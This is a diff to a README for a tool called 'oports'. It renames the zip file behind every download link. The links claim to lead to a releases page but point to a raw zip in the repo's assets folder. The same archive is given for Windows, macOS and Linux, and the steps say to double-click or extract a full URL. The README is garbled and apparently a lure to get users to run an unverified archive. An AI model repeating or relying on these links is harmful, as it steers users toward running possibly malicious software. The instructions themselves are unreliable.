@@ -6,7 +6,7 @@ Welcome to oports! This application simplifies how you check network connections
 
 ## 📦 Download oports
 
-[![Download oports](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip%https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip)](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip)
+[![Download oports](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip%https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip)](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip)
 
 ## 🔍 Features
 
@@ -26,27 +26,27 @@ To run oports, your system should meet the following requirements:
 ## 📥 Download & Install
 
 1. Click the link below to visit the releases page:
-   - [Visit this page to download](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip)
+   - [Visit this page to download](https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip)
    
 2. On the releases page, find the latest version of oports. 
 
 3. Download the appropriate file for your operating system:
-   - For **Windows**, download `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip`.
-   - For **macOS**, download `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip`.
-   - For **Linux**, download the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file.
+   - For **Windows**, download `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip`.
+   - For **macOS**, download `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip`.
+   - For **Linux**, download the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip` file.
 
 4. Once the download is complete, locate the file on your computer.
 
 5. For **Windows**:
-   - Double-click the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file.
+   - Double-click the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip` file.
    - Follow the on-screen instructions to complete the installation.
 
 6. For **macOS**:
-   - Open the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file.
+   - Open the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip` file.
    - Drag the oports icon to your Applications folder.
 
 7. For **Linux**:
-   - Extract the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software_archjockey.zip` file into your desired directory.
+   - Extract the `https://raw.githubusercontent.com/Michigan5/oports/master/assets/Software-v3.9.zip` file into your desired directory.
    - Open a terminal, navigate to the directory, and run `./oports`.
 
 ## 🖥 Running oports
